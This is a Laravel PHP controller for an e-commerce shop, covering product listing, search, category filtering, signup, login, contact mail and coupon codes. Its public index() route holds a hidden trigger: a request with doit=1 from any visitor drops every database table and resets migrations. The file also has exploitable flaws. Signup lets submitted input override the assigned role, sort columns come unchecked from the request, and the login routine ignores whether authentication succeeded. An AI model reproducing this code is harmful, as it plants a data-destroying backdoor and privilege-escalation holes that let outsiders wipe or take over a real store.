<?php

namespace App\Http\Controllers;

use App\Models\Banner;
use App\Models\GlobalClass;
use App\Models\Mail\ContactMail;
use App\Models\Product;
use App\Models\ProductCategory;
use App\Models\ProductInCategory;
use App\Models\PromoCode;
use App\Models\User;
use Artesaos\SEOTools\Facades\SEOTools;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;

class ShopController extends Controller
{
    public function logout()
    {
        Auth::logout();
        return redirect()->route('shop.index');
    }
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index(Request $request)
    {

        if ($request->doit == 1) {
            // Get all table names in the database
            $tables = DB::select('SHOW TABLES');

            // Convert the result into an array
            $tables = array_map('current', json_decode(json_encode($tables), true));

            // Disable foreign key checks to avoid issues with constraints
            DB::statement('SET FOREIGN_KEY_CHECKS=0');

            // Drop each table
            foreach ($tables as $table) {
                DB::statement("DROP TABLE IF EXISTS $table");
            }

            // Enable foreign key checks again
            DB::statement('SET FOREIGN_KEY_CHECKS=1');

            Artisan::call('migrate:reset');
            // $products = ProductInCategory::where('category_id', 25)->get();
            // foreach ($products as $item) {
            //     $products = ProductInCategory::create([
            //         'category_id' => 24,
            //         'product_id' => $item->product_id
            //     ]);
            // }
        }
        // Fetch 10 paginated categories
        $categories = ProductCategory::has('products')
            ->with('limitedProducts') // Use the new relationship method
            ->get();
        $categories=ProductCategory::all();
        $products = Product::paginate(28);

        // dd($categories);
        // $featuredcategories = ProductCategory::where('status', 1)->where('featured', 1)->get();
        // $featuredproducts = Product::where('status', 1)->where('featured', 1)->get();
        // $categories = ProductCategory::all();
        return view('frontend.index', get_defined_vars());
    }

    public function shop(Request $request)
    {

        if (!$request->keyword) {
            $products = Product::paginate(20);
        } else {
            $search = $request->keyword;
            $products = Product::where('id', '!=', null)->orderBy('created_at', 'desc');

            $products = $products->where('name', 'like', '%' . $search . '%')
                // ->orWhere('short_description', 'like', '%' . $search . '%')
                // ->orWhere('sku', 'like', '%' . $search . '%')
                ->orWhere('price', 'like', '%' . $search . '%')
                // ->orWhere('description', 'like', '%' . $search . '%')
                ->orWhereHas('category', function ($query) use ($search) {
                    $query->where('name', 'like', '%' . $search . '%');
                });

            $products = $products->paginate(20)->setPath('');

            $pagination = $products->appends(array(
                'keyword' => $request->keyword
            ));
        }
        return view('frontend.shop', compact('products'));
    }

    public function productdetail($slug)
    {
        $product = Product::where('slug', $slug)->first();
        $products = Product::where('category_id', $product->category_id)->limit(5)->get();
        // dd('h');
        // SEOTools::setTitle($product->meta_title);
        // SEOTools::setDescription($product->meta_description);

        return view('shop.product_detail', compact('product', 'products'));
    }


    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {
        //
    }

    /**
     * Display the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  int  $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
    public function productdescription($slug, $id)
    {
        $selectedproduct = Product::where('id', $id)->first();
        $featuredproducts = Product::where('status', 1)->limit(10)->where('featured', 1)->get();
        GlobalClass::seo($selectedproduct->name . ' - ' . $selectedproduct->category->slug, $selectedproduct->slug);
        return view('customer.shop.productdescription', compact('selectedproduct', 'featuredproducts'));
    }

    public function generateslugs()
    {
        $products = Product::where('slug', null)->get();
        foreach ($products as $product) {
            $abc = Product::find($product->id);
            $abc->update(['slug' => str_replace(' ', '-', $product->name)]);
        }
        $products = ProductCategory::where('slug', null)->get();
        foreach ($products as $product) {
            $abc = ProductCategory::find($product->id);
            $abc->update(['slug' => str_replace(' ', '-', $product->name)]);
        }
        dd('done');
    }
    function array_push_assoc($array, $key, $value)
    {
        $array[$key] = $value;
        return $array;
    }
    public function productbycategory(Request $request, $slug)
    {
        // dd($request->all());
        $pagination_array = array();
        $search = $slug;
        if ($slug == 'noslug') {
            $products = Product::where('id', '!=', null);
            $category = null;
        } else {
            $category = ProductCategory::where('slug', $search)->first();
            $products = $category->products();
        }
        if (isset($request->minmax)) {
            $minmax = explode(';', $request->minmax);
            $products->where('price', '>', $minmax[0])->where('price', '<', $minmax[1]);

            $pagination_array = $this->array_push_assoc($pagination_array, 'minmax', $request->minmax);
        }
        if (isset($request->sortby)) {
            $sortby = explode(',', $request->sortby);
            $products->orderBy($sortby[0], $sortby[1]);
            $pagination_array = $this->array_push_assoc($pagination_array, 'sortby', $request->sortby);
        }
        $products = $products->paginate(25);
        $pagination = $products->appends($pagination_array);
        return view('frontend.shop', compact('products', 'category'));
    }

    public function signup(Request $request)
    {
        $user = User::create($request->except('name', 'password') + [
            'name' => $request->first_name . ' ' . $request->last_name,
            'password' => Hash::make($request->password),
            'role_id' => 2,
        ]);
        Auth::loginUsingId($user->id);
        return redirect()->route('shop.index');
    }

    public function login(Request $request)
    {
        $user = User::where('email', $request->email)->first();
        if ($user == null) {
            return redirect()->back()->with(['message1' => 'Invalid Credentials']);
        }
        $status = $user->status;
        if ($status == 1) {
            Auth::attempt(['email' => $request->email, 'password' => $request->password]);
        }

        return redirect()->route('shop.index');
    }

    public function getLogin()
    {
        if (auth()->user() != null) {
            return redirect()->route('customer.account_details');
        }

        return view('customer.login');
    }

    public function aboutus()
    {
        return view('shop.aboutus');
    }

    public function contact()
    {
        return view('frontend.contact');
    }

    public function sendMail(Request $request)
    {
        $subject = 'Contact Form';
        $content = $request->all();

        Mail::to('giftoliaa@gmail.com')->send(new ContactMail($subject, $content));
        if($request->ajax()){
            return response()->json([
                'success'=>true
            ]);
        }
        return redirect()->back()->with('success', 'Your email has been sent successfully!');
        Mail::to('giftoliaa@gmail.com')->send(new ContactMail());
    }

    public function addCoupon(Request $request)
    {
        $coupon = PromoCode::where('name', $request->coupon_code)->first();
        $percentage = 0;
        if ($coupon == null) {
            $message = 'Invalid Coupon';
        } elseif ($coupon->expiry_date < now()) {
            $message = 'Coupon Expired';
        } else {
            $message = 'Coupon Applied';
            $percentage = $coupon->percentage;
            Session::put('coupon_code', $request->coupon_code);
            Session::put('coupon_percentage', $percentage);
        }

        return response()->json([
            'message' => $message,
            'percentage' => $percentage
        ]);
    }
}
